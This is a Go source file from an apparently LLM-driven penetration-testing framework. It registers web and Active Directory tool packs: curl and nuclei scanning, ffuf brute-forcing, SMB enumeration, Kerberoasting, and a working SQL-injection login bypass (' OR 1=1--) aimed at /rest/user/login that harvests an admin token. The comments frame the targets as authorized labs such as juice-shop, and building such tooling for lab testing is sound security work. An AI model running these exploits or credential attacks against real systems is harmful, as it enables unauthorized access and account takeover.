// Package scenarios —— 场景包机制 + web/AD 两包(对应 Python scenarios.py)。
//
// 场景包 = 工具集 + 指纹(按已发现 service 激活)。Register 把工具并入传入的 tools.Registry,
// 并在 Manager 里登记包与指纹, 供 Route 按 service 指纹激活对应包。
// web 包工具(curl/nuclei)已接真实执行 + parser, 对本地授权靶可跑出真实 finding。
package scenarios

import (
	"encoding/json"
	"fmt"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/Coff0xc/vero/internal/tools"
)

// Pack —— 场景包: 一组工具 + 指纹函数(已发现 service 集合 -> 是否激活)。
type Pack struct {
	Name        string
	Tools       []*tools.Tool
	Fingerprint func(services map[string]bool) bool
}

// Manager —— 场景包目录: 记录已注册的包及指纹(工具实体注册进 tools.Registry)。
type Manager struct {
	packs []Pack
}

func NewManager() *Manager { return &Manager{} }

// Register —— 把包的工具并入 tools.Registry, 并登记到 Manager(供路由)。
func (m *Manager) Register(reg *tools.Registry, p Pack) {
	for _, t := range p.Tools {
		reg.Register(t)
	}
	m.packs = append(m.packs, p)
}

// Route —— 场景路由: 按已发现 service 指纹激活匹配场景包(注册序稳定)。
func (m *Manager) Route(services map[string]bool) []string {
	var out []string
	for _, p := range m.packs {
		if p.Fingerprint(services) {
			out = append(out, p.Name)
		}
	}
	return out
}

// ---------- web 包 ----------

func httpProbe(args map[string]any) tools.ToolResult {
	return tools.Sh([]string{"curl", "-sI", tools.ArgStr(args, "target", "")}, 30*time.Second)
}

// webVuln —— 真实 nuclei 漏扫(聚焦 tech/exposure/misconfig 标签快扫, JSON 输出便于 parse)。
func webVuln(args map[string]any) tools.ToolResult {
	return tools.Sh([]string{"nuclei", "-u", tools.ArgStr(args, "target", ""),
		"-tags", "tech,exposure,misconfig", "-silent", "-j", "-timeout", "5"}, 300*time.Second)
}

// fingerprintHeaders —— 值得作为 tech 指纹提取的响应头(小写前缀/包含)。
var fingerprintHeaders = []string{"server:", "x-powered-by", "x-recruiting:", "via:", "x-generator", "x-aspnet"}

// ParseHTTP —— 从响应头提取 tech 指纹, 留逐字来源。
func ParseHTTP(out string, args map[string]any) []tools.Observation {
	t := tools.ArgStr(args, "target", "?")
	var obs []tools.Observation
	for _, l := range strings.Split(out, "\n") {
		low := strings.ToLower(strings.TrimSpace(l))
		for _, h := range fingerprintHeaders {
			if strings.HasPrefix(low, h) || strings.Contains(low, h) {
				s := strings.TrimSpace(l)
				obs = append(obs, tools.Observation{Kind: "finding", Key: t + ":tech:" + s, Label: s, Excerpt: s})
				break
			}
		}
	}
	return obs
}

// ParseNuclei —— 解析 nuclei -j (JSONL) 输出: 每个 finding 提取 模板/严重级/命中位置。
// Excerpt 用 matched-at(在原始 JSON 里逐字存在), 保证证据可逐字回查。
func ParseNuclei(out string, args map[string]any) []tools.Observation {
	var obs []tools.Observation
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if !strings.HasPrefix(line, "{") {
			continue
		}
		var f struct {
			TemplateID string `json:"template-id"`
			MatchedAt  string `json:"matched-at"`
			Info       struct {
				Name     string `json:"name"`
				Severity string `json:"severity"`
			} `json:"info"`
		}
		if json.Unmarshal([]byte(line), &f) != nil || f.TemplateID == "" {
			continue
		}
		at := f.MatchedAt
		if at == "" {
			at = f.TemplateID
		}
		obs = append(obs, tools.Observation{
			Kind:    "finding",
			Key:     f.TemplateID + "@" + at,
			Label:   fmt.Sprintf("[%s] %s", f.Info.Severity, f.Info.Name),
			Excerpt: at,
		})
	}
	return obs
}

// exploitSQLiLogin —— L3 真实利用: 对登录接口发 SQLi payload(经典 ' OR 1=1--), 尝试认证绕过。
// 对授权靶(juice-shop 等)有效, 成功则响应携带 authentication token。
// exploitSQLiLogin —— SQLi 登录绕过利用。curl(-4 强制 IPv4)+ 临时文件传 payload:
// 一次绕开三个坑 —— Windows 命令行引号转义、localhost→IPv6 挂起、Go net/http 对该靶的请求挂起。
func exploitSQLiLogin(args map[string]any) tools.ToolResult {
	target := baseURL(tools.ArgStr(args, "target", ""))
	f, err := os.CreateTemp("", "vero-sqli-*.json")
	if err != nil {
		return tools.ToolResult{Success: false, Stderr: err.Error(), RC: -1}
	}
	defer os.Remove(f.Name())
	_, _ = f.WriteString(`{"email":"' OR 1=1--","password":"x"}`)
	_ = f.Close()
	return tools.Sh([]string{"curl", "-s", "-4", "--max-time", "20",
		"--retry", "3", "--retry-delay", "2", "--retry-all-errors", // 前置工具(nuclei)过载靶场后自动重试
		"-X", "POST", target + "/rest/user/login", "-H", "Content-Type: application/json",
		"--data", "@" + f.Name()}, 90*time.Second)
}

// baseURL —— 归一化到 scheme://host:port(去 path/query), 缺 scheme 补 http。
// 让 exploit 无论 LLM 传根 URL 还是带路径, 都正确拼接端点(修 LLM 传 /rest/... 造成的路径重复)。
func baseURL(t string) string {
	t = strings.TrimSpace(t)
	if t == "" {
		return ""
	}
	if !strings.Contains(t, "://") {
		t = "http://" + t
	}
	i := strings.Index(t, "://")
	rest := t[i+3:]
	if j := strings.IndexByte(rest, '/'); j >= 0 {
		rest = rest[:j]
	}
	return t[:i+3] + rest
}

// ParseSQLi —— 检测认证绕过是否成功(响应含 authentication token)。
// Excerpt 取响应里 token 片段(逐字存在), 保证证据可回查。
func ParseSQLi(out string, args map[string]any) []tools.Observation {
	if !strings.Contains(out, `"authentication"`) || !strings.Contains(out, `"token"`) {
		return nil
	}
	ex := out
	if i := strings.Index(out, `"token":"`); i >= 0 {
		end := i + 48
		if end > len(out) {
			end = len(out)
		}
		ex = out[i:end]
	}
	t := tools.ArgStr(args, "target", "?")
	return []tools.Observation{{
		Kind:    "finding",
		Key:     t + ":sqli:login-bypass",
		Label:   "[critical] SQLi 登录绕过成功(获得 admin token)",
		Excerpt: ex,
	}}
}

// WebPack —— web 场景包: http 指纹时激活。
func WebPack() Pack {
	return Pack{
		Name: "web",
		Tools: []*tools.Tool{
			{Name: "http_probe", Level: tools.LevelScan, Desc: "HTTP HEAD 探测(curl -sI), 只取响应头做指纹, 不取页面 body", Run: httpProbe, Parse: ParseHTTP},
			{Name: "web_vuln_scan", Level: tools.LevelScan, Desc: "nuclei 漏洞扫描, 发现 web 暴露面/技术栈/配置缺陷/敏感端点", Run: webVuln, Parse: ParseNuclei},
			{Name: "ffuf_dir_brute", Level: tools.LevelScan, Desc: "ffuf 目录爆破, 发现隐藏路径/后台/备份文件, 需 wordlist 参数(可选)", Run: ffufDirBrute, Parse: ParseFFUF},
			{Name: "ffuf_vhost_enum", Level: tools.LevelScan, Desc: "ffuf 虚拟主机枚举, 通过 Host 头爆破子域名, 需 domain 参数", Run: ffufVhostEnum, Parse: ParseFFUFVhost},
			{Name: "exploit_sqli", Level: tools.LevelExploit, Desc: "SQLi 登录绕过利用, 对 /rest/user/login 发注入 payload 尝试认证绕过, 成功得 admin token", Run: exploitSQLiLogin, Parse: ParseSQLi},
		},
		Fingerprint: func(s map[string]bool) bool {
			return s["http"] || s["https"] || s["ssl/http"] || s["http-proxy"]
		},
	}
}

// ---------- AD / 内网包 ----------

func smbEnum(args map[string]any) tools.ToolResult {
	return tools.Sh([]string{"nxc", "smb", tools.ArgStr(args, "target", "")}, 60*time.Second)
}

func kerberoast(args map[string]any) tools.ToolResult {
	return tools.Sh([]string{"nxc", "ldap", tools.ArgStr(args, "target", ""),
		"-u", tools.ArgStr(args, "user", ""), "-p", tools.ArgStr(args, "pass", ""),
		"--kerberoasting", "out.txt"}, 120*time.Second)
}

var reSMB = regexp.MustCompile(`\(name:(\S+?)\)\s*\(domain:(\S+?)\)`)

// ParseSMB —— 从 nxc smb 输出提取域内主机名。
func ParseSMB(out string, args map[string]any) []tools.Observation {
	var obs []tools.Observation
	for _, l := range strings.Split(out, "\n") {
		if m := reSMB.FindStringSubmatch(l); m != nil {
			obs = append(obs, tools.Observation{
				Kind:    "host",
				Key:     tools.ArgStr(args, "target", m[1]),
				Label:   m[1] + "." + m[2],
				Excerpt: strings.TrimSpace(l),
			})
		}
	}
	return obs
}

// ADPack —— AD/内网场景包: SMB/LDAP/Kerberos 指纹时激活。
func ADPack() Pack {
	return Pack{
		Name: "ad",
		Tools: []*tools.Tool{
			{Name: "smb_enum", Level: tools.LevelScan, Desc: "SMB 枚举(nxc), 需目标 445/SMB 开放(Windows/Samba)", Run: smbEnum, Parse: ParseSMB},
			{Name: "kerberoast", Level: tools.LevelCred, Desc: "Kerberoasting(nxc), 需 AD 域凭证(user/pass)", Run: kerberoast},
		},
		Fingerprint: func(s map[string]bool) bool {
			return s["microsoft-ds"] || s["netbios-ssn"] || s["ldap"] || s["kerberos-sec"]
		},
	}
}

// RegisterDefaults —— 注册所有场景包。
func RegisterDefaults(m *Manager, reg *tools.Registry) {
	m.Register(reg, WebPack())
	m.Register(reg, ADPack())
	m.Register(reg, ADPackEnhanced())      // P0-2: NetExec 增强包
	m.Register(reg, PostExploitPack())     // P0-4: 凭证提取包
	m.Register(reg, ExploitPack())         // P1: Metasploit RPC
	m.Register(reg, CloudPack())           // P2: 云环境侦察
	m.Register(reg, ContainerPack())       // P3: 容器逃逸
}
